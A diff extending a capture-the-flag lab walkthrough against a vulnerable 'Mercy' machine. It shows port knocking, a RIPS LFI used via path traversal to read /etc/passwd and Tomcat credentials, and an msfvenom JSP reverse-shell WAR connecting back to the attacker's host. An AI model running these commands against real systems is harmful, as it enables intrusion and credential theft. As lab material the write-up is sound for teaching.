@@ -144,7 +144,7 @@ Nmap done: 1 IP address (1 host up) scanned in 253.20 seconds
 
 </details>
 
-# 2. Exploring tomcat
+# 2. Exploring tomcat at `8080`
 
 <details>
   <summary><h2>Attempting tomcat exploit → unsuccessful</h2></summary>
@@ -193,6 +193,14 @@ Not Vulnerable to CVE-2017-12617
 ```
 
 </details>
+
+## Checking web root directory
+
+Browsing to the web root directory reveals that tomcat admin users are defined in `/etc/tomcat7/tomcat-users.xml`
+
+```console
+NOTE: For security reasons, using the manager webapp is restricted to users with role "manager-gui". The host-manager webapp is restricted to users with role "admin-gui". Users are defined in /etc/tomcat7/tomcat-users.xml.
+```
 
 ## Checking interesting path revealed in nmap scan
 
@@ -576,3 +584,104 @@ Port Knocking Daemon Configuration
 </details>
 
 This explains why `80` and `22` showed up as `filtered` in the nmap scan
+
+# 4. Exploring HTTP at `80`
+
+Unlock port `80` with `knock -v 10.0.88.35 159 27391 4`
+
+<details>
+  <summary>Nmap reveals 2 paths at <code>/mercy</code> and <code>/nomercy</code></summary>
+
+```console
+┌──(root㉿kali)-[~]
+└─# nmap -p 80 -A 10.0.88.35
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-18 21:44 +08
+Nmap scan report for 10.0.88.35
+Host is up (0.0017s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
+|_http-title: Site doesn't have a title (text/html).
+| http-robots.txt: 2 disallowed entries
+|_/mercy /nomercy
+|_http-server-header: Apache/2.4.7 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3.2.0
+OS details: Linux 3.2.0
+Network Distance: 2 hops
+
+TRACEROUTE (using port 80/tcp)
+HOP RTT     ADDRESS
+1   0.39 ms 192.168.17.1
+2   1.31 ms 10.0.88.35
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 8.36 seconds
+```
+
+</details>
+
+`/mercy` holds a troll message, while `/nomercy` leads to the `RIPS` static code scanning tool
+
+![image](https://user-images.githubusercontent.com/90442032/208301920-8a36ba9f-4d9d-492a-bdfa-2cdae282c873.png)
+
+The exact RIPS version 0.53 has a [LFI vulnerability](https://www.exploit-db.com/exploits/18660)
+
+Testing the LFI with `curl -L http://10.0.88.35/nomercy/windows/code.php?file=../../../../../etc/passwd` works and it returned the queried `/etc/passwd` file
+
+```console
+⋮
+35 <? tomcat7:x:116:126::/usr/share/tomcat7:/bin/false
+36 <? pleadformercy:x:1000:1000:pleadformercy:/home/pleadformercy:/bin/bash
+37 <? qiu:x:1001:1001:qiu:/home/qiu:/bin/bash
+38 <? thisisasuperduperlonguser:x:1002:1002:,,,:/home/thisisasuperduperlonguser:/bin/bash
+39 <? fluffy:x:1003:1003::/home/fluffy:/bin/sh 
+⋮
+```
+
+Remember that there was a Tomcat admin users configuration file at `/etc/tomcat7/tomcat-users.xml`
+
+Retrieving the file with `curl -L http://10.0.88.35/nomercy/windows/code.php?file=../../../../../etc/tomcat7/tomcat-users.xml` returns the admin users credentials
+
+```console
+⋮
+29 <? <role rolename="admin-gui"/>
+30 <? <role rolename="manager-gui"/>
+31 <? <user username="thisisasuperduperlonguser" password="heartbreakisinevitable" roles="admin-gui,manager-gui"/>
+32 <? <user username="fluffy" password="freakishfluffybunny" roles="none"/>
+⋮
+```
+
+# 5. Getting a reverse shell from tomcat
+
+Logging to Tomcat Web Application Manager at `/manager` with the credentials found:
+
+![image](https://user-images.githubusercontent.com/90442032/208302438-1c354760-543e-43a4-9d3a-3b4867265af0.png)
+
+Generate a reverse shell war file to be uploaded to Tomcat
+
+```console
+┌──(root㉿kali)-[~]
+└─# msfvenom -p java/jsp_shell_reverse_tcp LHOST=kali.vx LPORT=4444 -f war -o reverse.war
+Payload size: 1087 bytes
+Final size of war file: 1087 bytes
+Saved as: reverse.war
+```
+
+Upload `reverse.war` in Tomcat Web Application Manager web console
+
+Start listener in kali: `rlwrap nc -nlvp 4444`
+
+Load the reverse shell: `curl -L http://10.0.88.35:8080/reverse`
+
+```console
+connect to [192.168.17.10] from (UNKNOWN) [10.0.88.35] 51324
+whoami
+tomcat7
+id
+uid=116(tomcat7) gid=126(tomcat7) groups=126(tomcat7)
+python -c 'import pty;pty.spawn("/bin/bash")'
+tomcat7@MERCY:/var/lib/tomcat7$
+```
